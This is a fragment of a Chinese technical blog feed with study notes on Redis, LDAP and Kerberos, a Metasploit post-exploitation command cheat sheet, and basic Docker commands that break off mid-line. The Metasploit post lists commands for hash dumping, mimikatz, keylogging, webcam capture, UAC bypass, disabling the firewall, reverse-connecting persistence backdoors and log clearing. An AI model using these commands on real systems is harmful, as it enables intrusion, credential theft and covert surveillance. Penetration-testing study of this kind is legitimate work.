title="Redis关键特性"></a>Redis关键特性</h2><ul><li>支持多数据库<br>名称不支持自定义，从0开始递增<br>默认情况下支持1 6个数据库,不做更改的情况下使用的是0号数据库<br>如果要切换当前使用的数据库: <code>select 0</code></li><li>可以通过正则表达式匹配所有符合规则的key值<br>keys正则表达式<br>要查找所有的a开头后面跟数字的所有的key值: <code>keys a[0-9]*</code></li><li>判断key是否存在: <code>exists key</code></li><li>删除key值: <code>del key key2</code></li><li>获取key对应的类型: <code>type key</code></li><li><code>redis中不区分大小写( 单个单词要不就全大写要不就全小写)</code></li></ul><h2 id="Redis数据类型及使用"><a href="#Redis数据类型及使用" class="headerlink" title="Redis数据类型及使用"></a>Redis数据类型及使用</h2><ul><li>String的数字可以作为数值类型使用</li><li>Hash添加数据时value是键值对(应用于对象数据存储)</li><li>List可重复的有序集合<br>操作数据时可以区分左右(前后)查询整个集合中的数据时<code>lrange key 0 -1</code></li><li>Set不重复无序的集合<br>可以针对集合计算交集、并集等</li><li>Sorted Set:有序集合,可以根据给key的分数进行排序</li></ul><h2 id="Redis性能优化"><a href="#Redis性能优化" class="headerlink" title="Redis性能优化"></a>Redis性能优化</h2><ul><li>可设置key的生存时间</li><li>Redis管道(pipeline) –&gt; 管道数据传输速度快于普通传输(仅在Java API中)</li><li>数据排序Sort,如果是对集合进行排序Sorted Set</li><li>Redis持久化(RDB&#x2F;AOF)<br>RDB(默认) :使用快照的方式对当前数据进行持久化存储<br>创建快照的条件(在指定时间内有指定数量的key发生变化): <code>save 时间s数量</code><br>手动触发: sava、bgsave<br>save:使用主进程运行，在创建快照过程中会堵塞其他进程运行<br>bgsave:划分一个子进程用于执行快照，不会影响其他得到进程运行<br>AOF:使用的日志文件形式存储信息<br>可以设定数据发生变更时进行记录\</li><li>Redis内存占用情况<br>相同数据的情况下，32位操作系统比64位所使用的内存更少<br>100万条简单键值对，占用100M空间，实际占用空间较少，可存储数据量较大</li></ul><h2 id="Redis的优化"><a href="#Redis的优化" class="headerlink" title="Redis的优化"></a>Redis的优化</h2><ol><li>精简键名值数据:尽可能简单，但是能知意–&gt;<code>可以节省存储空间</code></li><li>在不需要持久化的应用场景中关闭持久化功能</li><li>内部编码优化</li><li>SlowLog:记录运行超时命令系统</li><li>修改Linux内核内存分配策略: 1:不需要检验内存情况，可以直接运行任务直到内存使用完为止</li><li>关闭THP:节省资源开销(redis修改时先复制再对复制内容修改)<br>(THP:如果数据只有200K,使用THP的情况下，这个大页大小约20M<br>不使用THP时，复制后总大小400K,使用了THP复制后总大小40M)</li><li>修改linux中的tcp最大连接数</li><li>限制Redis使用内存大小</li><li>做多条数据操作时，尽量选择批量操作命令不要通过循环执行</li></ol><h1 id="安全认证-amp-权限管理Kerberos-amp-Ldap"><a href="#安全认证-amp-权限管理Kerberos-amp-Ldap" class="headerlink" title="安全认证&amp;权限管理Kerberos &amp; Ldap"></a>安全认证&amp;权限管理Kerberos &amp; Ldap</h1><pre><code>在大数据平台中，统一身份体现在:只要通过用户名和密码成功登陆，就可以操作授`权过的组件`统一用户管理系统:用户及相关权限管理、用户登录后的相关管理等</code></pre><h2 id="统一身份认证管理系统"><a href="#统一身份认证管理系统" class="headerlink" title="统一身份认证管理系统"></a>统一身份认证管理系统</h2><ul><li>管理模块:管理信息存储,管理认证，用户请求</li><li>信息存储模块:存储用户信息、权限信息</li><li>认证模块:通过用户请求和当前系统存储的用户信息做比对，确认用户是否正确、核查用户权限</li></ul><h2 id="Ldap目录服务系统"><a href="#Ldap目录服务系统" class="headerlink" title="Ldap目录服务系统"></a>Ldap目录服务系统</h2><ul><li>目录:加快数据检索速度</li><li>轻量级目录访问协议、跟踪协议</li></ul><h2 id="LdapServer系统结构-树状结构"><a href="#LdapServer系统结构-树状结构" class="headerlink" title="LdapServer系统结构(树状结构)"></a>LdapServer系统结构(树状结构)</h2><ul><li>树状结构中会包含很多节点，每个节点都有自己的名称dn(当前节点及它的所有父节点)</li><li>根节点名称是dc,标记为区域</li><li>区域的下一级是组织，组织节点名称: ou</li><li>组织节点下一级是对象，对象节点名称: cn,存储对象属性</li></ul><h2 id="Ldap功能模块设计"><a href="#Ldap功能模块设计" class="headerlink" title="Ldap功能模块设计"></a>Ldap功能模块设计</h2><ul><li>查询类操作</li><li>更新类操作</li><li>认证类操作</li><li>其他操作:放弃服务或者扩展服务</li></ul><h2 id="Ldap集成设计"><a href="#Ldap集成设计" class="headerlink" title="Ldap集成设计"></a>Ldap集成设计</h2><ul><li>身份认证架构设计</li></ul><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151423534.png?token=ARYCSATO5HTD633FH2FZWO3CQCOKS"></p><ul><li><p>身份认证流程设计</p><ol><li>应用侧提交认证请求</li><li>Thrift Server从Ldap获取相关用户信息</li><li>Thrift Server执行认证比对</li><li>认证成功后将请求导向响应的应用</li></ol></li><li><p>身份认证功能设计<br>  可以通过组Group和角色Role的方式给用户赋予权限<br>  Group:设置组权限，将用户添加到组中<br>  Role:给角色设定权限，给用户匹配角色</p></li></ul><h2 id="Kerberos认证处理"><a href="#Kerberos认证处理" class="headerlink" title="Kerberos认证处理"></a>Kerberos认证处理</h2><ul><li>krbServer中的三大核心: Client 、KDC、 KDC Server</li><li>Client :接收用户请求</li><li>KDC:生成密钥，发放密钥等</li><li>KDC Server:提供密钥服务</li></ul><h2 id="Kerberos应用流程"><a href="#Kerberos应用流程" class="headerlink" title="Kerberos应用流程"></a>Kerberos应用流程</h2><ol><li>用户提供用户名和密码给登录认证系统</li><li>登录认证系统通过登录认证后，反馈一个当前用户的用户信息卡 (用户、密码、所授权信息)</li><li>用户获取到用户信息卡之后就可以进入到MRS中.</li><li>在MRS中找到对应的要使用的组件,提交自己的信息卡</li><li>组件对比信息卡查看是否具有当前组件的权限</li><li>用户前往权限授权中心,提交信息卡,权限授权中心根据信息卡对指定组件进行授权(ST)</li><li>用户获取到对应组件的授权信息，可以再次向组件发起请求(信息卡, ST)</li><li>组件接收到请求后再次校验,校验结果没问题的话，用户就可以正常使用组件</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;大数据概述-amp-解决办法&quot;&gt;&lt;a href=&quot;#大数据概述-amp-解决办法&quot; class=&quot;headerlink&quot; title=&quot;大数据概述&amp;amp;解决办法&quot;&gt;&lt;/a&gt;大数据概述&amp;amp;解决办法&lt;/h1&gt;&lt;h2 id=&quot;大数据的特征（5v-1c）&quot;&gt;&lt;a href=&quot;#大数据的特征（5v-1c）&quot; class=&quot;headerlink&quot; title=&quot;大数据的特征（5v+1c）&quot;&gt;&lt;/a&gt;大数据的特征（5v+1c）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;大量：数据量巨大，MB,GB,TB,PB&lt;/li&gt;
&lt;li&gt;多样：数据类型多样，数据来源多样 数据来源：服务器日志、网站浏览信息、社交&lt;br&gt;结构化数据：表格数据 平台、摄像头信息&lt;br&gt;半结构化数据：网页html、xml&lt;br&gt;非结构化数据：视频、音频、图片、文字&lt;/li&gt;
&lt;li&gt;高速：数据产生速度快、数据处理速度快&lt;/li&gt;
&lt;li&gt;价值：价值密度低&lt;/li&gt;
&lt;li&gt;准确：数据真实性&lt;/li&gt;
&lt;li&gt;复杂：数据产生速度快、数据的类型多样等特征，导致做数据处理时处理过程变得很复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;大数据处理流程&quot;&gt;&lt;a href=&quot;#大数据处理流程&quot; class=&quot;headerlink&quot; title=&quot;大数据处理流程&quot;&gt;&lt;/a&gt;大数据处理流程&lt;/h2&gt;&lt;p&gt;数据采集-&amp;gt;数据预处理-&amp;gt;数据存储-&amp;gt;分析挖掘-&amp;gt;数据可视化&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="HCIA" scheme="http://example.com/tags/HCIA/"/>
    
    <category term="大数据" scheme="http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>msf后渗透使用</title>
    <link href="http://example.com/2022/04/18/msf%E5%90%8E%E6%B8%97%E9%80%8F%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/04/18/msf%E5%90%8E%E6%B8%97%E9%80%8F%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-18T00:51:15.000Z</published>
    <updated>2022-04-20T07:15:02.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="msf后渗透命令整理"><a href="#msf后渗透命令整理" class="headerlink" title="msf后渗透命令整理"></a>msf后渗透命令整理</h1><ul><li>后渗透基本知识</li><li>权限维持,权限提升,内网渗透等</li><li>内网渗透:信息收集,读取用户hash,浏览器密码等</li><li>域渗透:获取域控权限</li></ul><h2 id="1-后渗透基本操作"><a href="#1-后渗透基本操作" class="headerlink" title="1.后渗透基本操作"></a>1.后渗透基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background    让meterpreter处于后台</span><br><span class="line">sessions -i 会话号    与会话进行交互</span><br><span class="line">quit     退出会话</span><br><span class="line">shell    获取一个交互式shell</span><br><span class="line">irb            开启ruby终端</span><br></pre></td></tr></table></figure><h2 id="2-文件操作命令"><a href="#2-文件操作命令" class="headerlink" title="2.文件操作命令"></a>2.文件操作命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>     查看文件内容</span><br><span class="line">getwd    查看当前工作目录</span><br><span class="line">upload    上传文件</span><br><span class="line">download    下载文件</span><br><span class="line">edit    编辑文件</span><br><span class="line">search    搜索文件</span><br></pre></td></tr></table></figure><h2 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig查看网络接口信息</span><br><span class="line">portwd端口转发本机监听端口把目标机端口转到本机端口上</span><br><span class="line">rdesktop使用rdesktop来连接 -u 用户名 -p 密码</span><br><span class="line">route获取路由表</span><br></pre></td></tr></table></figure><h2 id="后渗透基本操作"><a href="#后渗透基本操作" class="headerlink" title="后渗透基本操作"></a>后渗透基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps    查看当前进程</span><br><span class="line">migrate pid            将meterpreter进程pid移动到指定进程中</span><br><span class="line">execute -H -i -f cmd.exe    创建新进程cmd.exe -H不可见-i交互</span><br><span class="line">getpid获                   取当前进程的pid</span><br><span class="line"><span class="built_in">kill</span> pid            杀死进程</span><br><span class="line">getuid                    查看当前权限</span><br><span class="line">sysinfo                    查看目标机系统信息</span><br></pre></td></tr></table></figure><h2 id="后渗透高级操作"><a href="#后渗透高级操作" class="headerlink" title="后渗透高级操作"></a>后渗透高级操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications 获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks 获取最近的文件操作</span><br><span class="line">run scraper                 获取常见信息</span><br><span class="line">run post/windows/gather/enum_patches         获取补丁信息</span><br><span class="line">run post/windows/gather/enum_domain          查找域控</span><br><span class="line"></span><br><span class="line">load命令  </span><br><span class="line">load mimikatz                                   加载mimikatz</span><br><span class="line">wdigest                                        获取用户密码</span><br><span class="line">load incognito                      加载incognito盗取主机用户令牌假冒用户</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm检查是否为虚拟机</span><br><span class="line">cmd下 quser查看用户是否在线</span><br><span class="line">idletime检查受害者闲置了多久</span><br><span class="line">screenshot        截屏</span><br></pre></td></tr></table></figure><h3 id="用户口令"><a href="#用户口令" class="headerlink" title="用户口令"></a>用户口令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump获取用户<span class="built_in">hash</span></span><br><span class="line">run post/windows/gather/smart_hashdump获取域的密码</span><br></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通用户利用漏洞获取权限</span><br><span class="line">use exploit/windows/local/ms18_8120_win32k_privesc</span><br></pre></td></tr></table></figure><h3 id="自动匹配提权模块"><a href="#自动匹配提权模块" class="headerlink" title="自动匹配提权模块"></a>自动匹配提权模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search <span class="built_in">local</span>/ms</span><br></pre></td></tr></table></figure><h3 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac </span><br><span class="line">use exploit/windows/local/bypassuac_injection </span><br><span class="line">use windows/local/bypassuac_vbs </span><br><span class="line">use windows/local/ask</span><br></pre></td></tr></table></figure><h3 id="获取system权限"><a href="#获取system权限" class="headerlink" title="获取system权限"></a>获取system权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><h3 id="缓存口令"><a href="#缓存口令" class="headerlink" title="缓存口令"></a>缓存口令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取谷歌chrome缓存</span><br><span class="line">run post/windows/gather/enum_chrome</span><br><span class="line"></span><br><span class="line">获取火狐firfox缓存</span><br><span class="line">run post/windows/gather/enum_firefox</span><br><span class="line"></span><br><span class="line">获取IE缓存</span><br><span class="line">run post/windows/gather/enum_ie</span><br></pre></td></tr></table></figure><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start开启键盘记录</span><br><span class="line">keyscan_dump显示捕捉到的记录</span><br><span class="line">keyscan_stop停止键盘记录</span><br></pre></td></tr></table></figure><h3 id="域口令获取"><a href="#域口令获取" class="headerlink" title="域口令获取"></a>域口令获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steal_token 试图窃取指定(pid)进程的令牌</span><br><span class="line">use incognito加载incoginto功能(盗取目标主机的令牌或是假冒用户)</span><br><span class="line">list_tokens -u列出目标主机用户的可用令牌</span><br><span class="line">list_tokens -g列出目标主机用户组的可用令牌</span><br></pre></td></tr></table></figure><h3 id="摄像头信息"><a href="#摄像头信息" class="headerlink" title="摄像头信息"></a>摄像头信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">record_mic音频录制</span><br><span class="line">webcam_chat查看摄像头接口</span><br><span class="line">webcam_list查看摄像头列表</span><br><span class="line">webcam_stream摄像头视频获取</span><br></pre></td></tr></table></figure><h3 id="后门持久化-权限维持"><a href="#后门持久化-权限维持" class="headerlink" title="后门持久化,权限维持"></a>后门持久化,权限维持</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.migrate</span><br><span class="line">migrate pid</span><br><span class="line">可以将meterpreter的当前进程迁移到其他指定进程中,这样做的好处是给后门一个相对稳定的环境,同时可以防止杀软</span><br><span class="line"></span><br><span class="line">2.metsvc</span><br><span class="line">run metsvc -A</span><br><span class="line">meterpreter提供两种方式的后门,一种是通过服务启动(metsvc),一种是通过启动项启动(persistence).</span><br><span class="line">通过服务(metsvc)启动方式,优点是命令简单方便,不需要设置太多参数.缺点是只要发现了这个后门,所有人都可以连接</span><br><span class="line"></span><br><span class="line">3.persistence</span><br><span class="line">run persistence -S -U -X -i 5 -p 端口 -r ip</span><br><span class="line">通过开机启动项启动的方式,缺点是命令参数多比较复杂,可能因为启动项权限原因,导致失败,且并无回显.优点是,因为载入启动项中,所以一般的杀软都会放行,如果在用shellcode做下免杀会更好,当然这是后话</span><br><span class="line">-A   自动启动一个匹配的exploit / multi / handler来连接到代理</span><br><span class="line">-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。</span><br><span class="line">-P   有效负载使用，默认为windows / meterpreter / reverse_tcp。</span><br><span class="line">-S   作为服务自动启动代理程序（具有SYSTEM权限）</span><br><span class="line">-T   要使用的备用可执行模板</span><br><span class="line">-U   用户登录时自动启动代理</span><br><span class="line">-X   系统引导时自动启动代理程序</span><br><span class="line">-h   这个帮助菜单</span><br><span class="line">-i   每次连接尝试之间的时间间隔（秒）</span><br><span class="line">-p   运行Metasploit的系统正在侦听的端口</span><br><span class="line">-r   运行Metasploit监听连接的系统的IP</span><br><span class="line"></span><br><span class="line">4.run vnc(远程控制,类似3389远程桌面)</span><br><span class="line">run vnc</span><br><span class="line">run post/windows/manager/enable_rdp开启远程桌面</span><br><span class="line"></span><br><span class="line">5.getuid(创建一个用户,客户端化)</span><br><span class="line">常用命令</span><br><span class="line">run getuid -e开启远程桌面</span><br><span class="line">run getuid -u name -p password添加用户</span><br><span class="line">run getuid -f4446 -e将3389端口转发到4446</span><br></pre></td></tr></table></figure><h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h3><p>清楚所有日志信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;msf后渗透命令整理&quot;&gt;&lt;a href=&quot;#msf后渗透命令整理&quot; class=&quot;headerlink&quot; title=&quot;msf后渗透命令整理&quot;&gt;&lt;/a&gt;msf后渗透命令整理&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;后渗透基本知识&lt;/li&gt;
&lt;li&gt;权限维持,权限提升,内网渗透等&lt;/li&gt;
&lt;li&gt;内网渗透:信息收集,读取用户hash,浏览器密码等&lt;/li&gt;
&lt;li&gt;域渗透:获取域控权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1-后渗透基本操作&quot;&gt;&lt;a href=&quot;#1-后渗透基本操作&quot; class=&quot;headerlink&quot; title=&quot;1.后渗透基本操作&quot;&gt;&lt;/a&gt;1.后渗透基本操作&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;background		    让meterpreter处于后台&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sessions -i 会话号	    与会话进行交互&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;quit 			    退出会话&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell			    获取一个交互式shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;irb		            开启ruby终端&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;2-文件操作命令&quot;&gt;&lt;a href=&quot;#2-文件操作命令&quot; class=&quot;headerlink&quot; title=&quot;2.文件操作命令&quot;&gt;&lt;/a&gt;2.文件操作命令&lt;/h2&gt;</summary>
    
    
    
    <category term="工具使用" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="kali" scheme="http://example.com/tags/kali/"/>
    
    <category term="渗透" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>docker基本使用</title>
    <link href="http://example.com/2022/04/18/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/04/18/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-18T00:33:24.000Z</published>
    <updated>2022-04-18T00:34:49.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker帮助命令"><a href="#docker帮助命令" class="headerlink" title="docker帮助命令"></a>docker帮助命令</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">version</span> 显示版本信息</span><br><span class="line">docker <span class="keyword">help</span> 帮助</span><br><span class="line">docker info 基本信息</span><br></pre></td></tr></table></figure><h2 id="docker镜像命令"><a href="#docker镜像命令" class="headerlink" title="docker镜像命令"></a>docker镜像命令</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">images</span></span><br><span class="line"><span class="comment"># 可选项</span></span><br><span class="line">-<span class="string">a</span>, <span class="built_in">--all</span>   <span class="comment"># 列出所有镜像</span></span><br><span class="line">-<span class="string">q</span>, <span class="built_in">--quite</span> <span class="comment"># 只显示镜像的id</span></span><br></pre></td></tr></table></figure><h4 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可选项</span></span><br><span class="line"><span class="attr">--filter</span>=STARS=<span class="number">3000</span> <span class="comment"># 搜索星在3000以上的</span></span><br></pre></td></tr></table></figure><h4 id="docker-pull-下载镜像"><a href="#docker-pull-下载镜像" class="headerlink" title="docker pull 下载镜像"></a>docker pull 下载镜像</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 下载镜像 docker pull 镜像名 tag</span></span><br><span class="line"><span class="meta"># 如果不写tag默认就是最新版</span></span><br></pre></td></tr></table></figure><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> <span class="operator">-f</span> id <span class="comment"># 删除指定容器</span></span><br><span class="line">docker <span class="built_in">rm</span> <span class="operator">-f</span> <span class="variable">$</span>(docker images <span class="literal">-qa</span>) <span class="comment"># 删除所有容器</span></span><br></pre></td></tr></table></figure><h2 id="docker容器命令"><a href="#docker容器命令" class="headerlink" title="docker容器命令"></a>docker容器命令</h2><p><strong>新建容器并启动</strong></p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-</span>-name = &quot;名字&quot; <span class="comment"># 给容器起一个名字</span></span><br><span class="line"><span class="literal">-</span>d            <span class="comment"># 后台方式运行</span></span><br><span class="line"><span class="literal">-</span>it           <span class="comment"># 使用交互式方式运行</span></span><br><span class="line"><span class="literal">-</span>P            <span class="comment"># 指定容器的端口</span></span><br><span class="line">    1.ip:主机端口:容器端口</span><br><span class="line">    2.主机端口:容器端口(常用)</span><br><span class="line">    3.容器端口</span><br><span class="line"><span class="literal">-</span>p            <span class="comment"># 随机端口</span></span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro ~ %docker run -it centos <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line">退出</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>查看运行的容器</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> ps </span><br><span class="line"><span class="comment"># -a 历史运行过的容器</span></span><br><span class="line"><span class="comment"># -n=? 显示最近创建的容器</span></span><br><span class="line"><span class="comment"># -q 只显示容器的编号</span></span><br></pre></td></tr></table></figure><p><strong>启动和停止容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start <span class="built_in">id</span> <span class="comment">#启动容器</span></span><br><span class="line">docker restart <span class="built_in">id</span> <span class="comment">#重启容器</span></span><br><span class="line">docker stop <span class="built_in">id</span> <span class="comment">#停止当前正在运行的容器</span></span><br><span class="line">docker <span class="built_in">kill</span> <span class="built_in">id</span> <span class="comment">#强制停止当前容器</span></span><br></pre></td></tr></table></figure><p><strong>查看日志</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf --<span class="built_in">tail</span> 日志条数 <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><strong>查看镜像元数据</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><strong>进入正在运行的容器</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line">docker attach <span class="built_in">id</span> <span class="comment"># 进入容器正在执行的终端</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#方法二</span></span><br><span class="line">docker exec -<span class="keyword">it</span> <span class="built_in">id</span> bashshell <span class="comment">#进入容器后开启新的终端</span></span><br></pre></td></tr></table></figure><p><strong>从容器拷贝文件到主机</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker 